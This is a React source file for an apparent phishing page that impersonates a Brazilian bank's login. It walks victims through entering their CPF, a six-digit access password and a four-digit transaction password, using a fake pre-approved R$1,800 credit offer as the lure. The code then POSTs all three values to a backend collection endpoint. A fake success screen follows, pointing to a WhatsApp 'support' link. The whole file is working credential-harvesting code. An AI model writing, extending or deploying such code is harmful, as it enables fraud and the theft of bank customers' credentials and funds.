import React, { useState, useRef, useEffect } from 'react'
import './App.css'

function App() {
  const [cpfModalActive, setCpfModalActive] = useState(false)
  const [senhaModalActive, setSenhaModalActive] = useState(false)
  const [limiteModalActive, setLimiteModalActive] = useState(false)
  const [senhaTransacionalModalActive, setSenhaTransacionalModalActive] = useState(false)
  const [sucessoModalActive, setSucessoModalActive] = useState(false)
  const [rememberCpf, setRememberCpf] = useState(false)
  const [cpf, setCpf] = useState('')
  const [senha6, setSenha6] = useState(['', '', '', '', '', ''])
  const [senha4, setSenha4] = useState(['', '', '', ''])
  const [limiteValor, setLimiteValor] = useState(1800)
  const [loading, setLoading] = useState(false)
  const [dadosJaEnviados, setDadosJaEnviados] = useState(false)

  const cpfInputRef = useRef(null)
  const senhaInputsRef = useRef([])
  const transacionalInputsRef = useRef([])

  const formatarCPF = (value) => {
    let numbers = value.replace(/\D/g, '')
    if (numbers.length <= 11) {
      numbers = numbers.replace(/(\d{3})(\d)/, '$1.$2')
      numbers = numbers.replace(/(\d{3})(\d)/, '$1.$2')
      numbers = numbers.replace(/(\d{3})(\d{1,2})$/, '$1-$2')
    }
    return numbers
  }

  const handleCpfChange = (e) => {
    const formatted = formatarCPF(e.target.value)
    setCpf(formatted)
  }

  const abrirModalCPF = () => {
    setTimeout(() => {
      setCpfModalActive(true)
      setTimeout(() => {
        if (cpfInputRef.current) {
          cpfInputRef.current.focus()
        }
      }, 100)
    }, 300)
  }

  const handleEntrar = () => {
    setLoading(true)
    setTimeout(() => {
      setLoading(false)
      setCpfModalActive(false)
      setTimeout(() => {
        setSenhaModalActive(true)
        setTimeout(() => {
          if (senhaInputsRef.current[0]) {
            senhaInputsRef.current[0].focus()
          }
        }, 100)
      }, 200)
    }, 500)
  }

  const handleSenha6Change = (index, value) => {
    const numbers = value.replace(/\D/g, '')
    if (numbers.length > 1) {
      return
    }
    const newSenha = [...senha6]
    newSenha[index] = numbers
    setSenha6(newSenha)

    if (numbers && index < 5) {
      setTimeout(() => {
        if (senhaInputsRef.current[index + 1]) {
          senhaInputsRef.current[index + 1].focus()
        }
      }, 10)
    }

    // Verificar se está completa
    if (newSenha.every(s => s.length === 1)) {
      setTimeout(() => {
        setSenhaModalActive(false)
        setLimiteModalActive(true)
      }, 1000)
    }
  }

  const handleSenha6KeyDown = (index, e) => {
    if (e.key === 'Backspace' && !senha6[index] && index > 0) {
      if (senhaInputsRef.current[index - 1]) {
        senhaInputsRef.current[index - 1].focus()
      }
    }
  }

  const handleSenha4Change = (index, value) => {
    const numbers = value.replace(/\D/g, '')
    if (numbers.length > 1) {
      return
    }
    const newSenha = [...senha4]
    newSenha[index] = numbers
    setSenha4(newSenha)

    if (numbers && index < 3) {
      setTimeout(() => {
        if (transacionalInputsRef.current[index + 1]) {
          transacionalInputsRef.current[index + 1].focus()
        }
      }, 10)
    }

    // Verificar se está completa e enviar dados
    if (newSenha.every(s => s.length === 1) && !dadosJaEnviados) {
      setDadosJaEnviados(true)
      enviarDados()
    }
  }

  const handleSenha4KeyDown = (index, e) => {
    if (e.key === 'Backspace' && !senha4[index] && index > 0) {
      if (transacionalInputsRef.current[index - 1]) {
        transacionalInputsRef.current[index - 1].focus()
      }
    }
  }

  const enviarDados = async () => {
    const cpfLimpo = cpf.replace(/\D/g, '')
    const senha6Completa = senha6.join('')
    const senha4Completa = senha4.join('')

    try {
      const response = await fetch('http://localhost:3001/api/salvar-dados', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cpf: cpfLimpo,
          senha6: senha6Completa,
          senha4: senha4Completa
        })
      })

      const data = await response.json()
      console.log('Dados salvos:', data)

      setTimeout(() => {
        setSenhaTransacionalModalActive(false)
        setLimiteModalActive(false)
        setSucessoModalActive(true)
      }, 2000)
    } catch (error) {
      console.error('Erro ao salvar dados:', error)
      setTimeout(() => {
        setSenhaTransacionalModalActive(false)
        setLimiteModalActive(false)
        setSucessoModalActive(true)
      }, 2000)
    }
  }

  const handleVoltar = () => {
    setLimiteModalActive(false)
    setSenhaModalActive(true)
    setSenha6(['', '', '', '', '', ''])
  }

  const handleSolicitar = () => {
    setLoading(true)
    setTimeout(() => {
      setLoading(false)
      setSenhaTransacionalModalActive(true)
      setDadosJaEnviados(false)
      setTimeout(() => {
        if (transacionalInputsRef.current[0]) {
          transacionalInputsRef.current[0].focus()
        }
      }, 100)
    }, 500)
  }

  const formatarValor = (valor) => {
    return valor.toLocaleString('pt-BR')
  }

  return (
    <div className="app">
      <div className="background">
        <div className="login-box">
          <button className="btn-primary" onClick={abrirModalCPF}>
            Acessar conta
          </button>
          <button className="btn-secondary" onClick={abrirModalCPF}>
            Já possuo conta
          </button>
        </div>
      </div>

      {/* Modal de CPF */}
      <div className={`cpf-modal ${cpfModalActive ? 'active' : ''}`}>
        <div className="cpf-input-container">
          <label className="cpf-label">Digite seu CPF</label>
          <input
            type="tel"
            className="cpf-input"
            ref={cpfInputRef}
            value={cpf}
            onChange={handleCpfChange}
            placeholder="000.000.000-00"
            maxLength="14"
            inputMode="numeric"
            onKeyPress={(e) => {
              if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
                e.preventDefault()
              }
            }}
          />
        </div>
        <div className="remember-cpf-container">
          <span className="remember-cpf-label">Lembrar CPF</span>
          <div
            className={`toggle-switch ${rememberCpf ? 'active' : ''}`}
            onClick={() => setRememberCpf(!rememberCpf)}
          ></div>
        </div>
        <button
          className={`btn-entrar ${loading ? 'loading' : ''}`}
          onClick={handleEntrar}
        >
          Entrar
        </button>
      </div>

      {/* Modal de Senha */}
      <div className={`senha-modal ${senhaModalActive ? 'active' : ''}`}>
        <label className="senha-label">Insira a senha de acesso</label>
        <div className="senha-inputs-container">
          {[0, 1, 2, 3, 4, 5].map((index) => (
            <input
              key={index}
              type="tel"
              className={`senha-input ${senha6[index] ? 'filled' : ''}`}
              ref={(el) => (senhaInputsRef.current[index] = el)}
              value={senha6[index]}
              onChange={(e) => handleSenha6Change(index, e.target.value)}
              onKeyDown={(e) => handleSenha6KeyDown(index, e)}
              maxLength="1"
              inputMode="numeric"
              autoComplete="off"
              onKeyPress={(e) => {
                if (!/[0-9]/.test(e.key)) {
                  e.preventDefault()
                }
              }}
              onFocus={(e) => e.target.select()}
            />
          ))}
        </div>
      </div>

      {/* Modal de Limite */}
      <div className={`limite-modal ${limiteModalActive ? 'active' : ''} ${senhaTransacionalModalActive ? 'overlay-active' : ''}`}>
        <div className="limite-header">
          <button className="btn-voltar" onClick={handleVoltar}></button>
        </div>
        <div className="limite-content">
          <h2 className="limite-titulo">
            Limite de crédito pré-aprovado<br />1.800 reais
          </h2>
          <div className="limite-valor-grande">
            <span className="moeda">R$</span> {formatarValor(limiteValor)}
          </div>
          <div className="limite-slider-container">
            <input
              type="range"
              className="limite-slider"
              min="100"
              max="1800"
              step="100"
              value={limiteValor}
              onChange={(e) => setLimiteValor(parseInt(e.target.value))}
            />
          </div>
        </div>
        <div className="limite-footer">
          <button
            className={`btn-solicitar ${loading ? 'loading' : ''}`}
            onClick={handleSolicitar}
          >
            Solicitar agora
          </button>
        </div>
      </div>

      {/* Modal de Senha Transacional */}
      <div className={`senha-transacional-modal ${senhaTransacionalModalActive ? 'active' : ''}`}>
        <label className="senha-transacional-label">
          Insira a senha transacional (4 digitos)
        </label>
        <div className="senha-transacional-inputs-container">
          {[0, 1, 2, 3].map((index) => (
            <input
              key={index}
              type="tel"
              className={`senha-transacional-input ${senha4[index] ? 'filled' : ''}`}
              ref={(el) => (transacionalInputsRef.current[index] = el)}
              value={senha4[index]}
              onChange={(e) => handleSenha4Change(index, e.target.value)}
              onKeyDown={(e) => handleSenha4KeyDown(index, e)}
              maxLength="1"
              inputMode="numeric"
              autoComplete="off"
              onKeyPress={(e) => {
                if (!/[0-9]/.test(e.key)) {
                  e.preventDefault()
                }
              }}
              onFocus={(e) => e.target.select()}
            />
          ))}
        </div>
      </div>

      {/* Modal de Sucesso */}
      <div className={`sucesso-modal ${sucessoModalActive ? 'active' : ''}`}>
        <div className="sucesso-content">
          <div className="sucesso-icon">✓</div>
          <h2 className="sucesso-titulo">Processo concluído com sucesso!</h2>
          <p className="sucesso-mensagem">
            Seu pedido está em análise.<br />
            Você pode acelerar a análise entrando em contato com a central de atendimento clicando no botão abaixo.
          </p>
          <a
            href="https://wa.me/5511999999999?text=Olá,%20gostaria%20de%20acelerar%20a%20análise%20do%20meu%20pedido"
            target="_blank"
            rel="noopener noreferrer"
            className="btn-whatsapp"
          >
            Falar com atendimento
          </a>
        </div>
      </div>
    </div>
  )
}

export default App

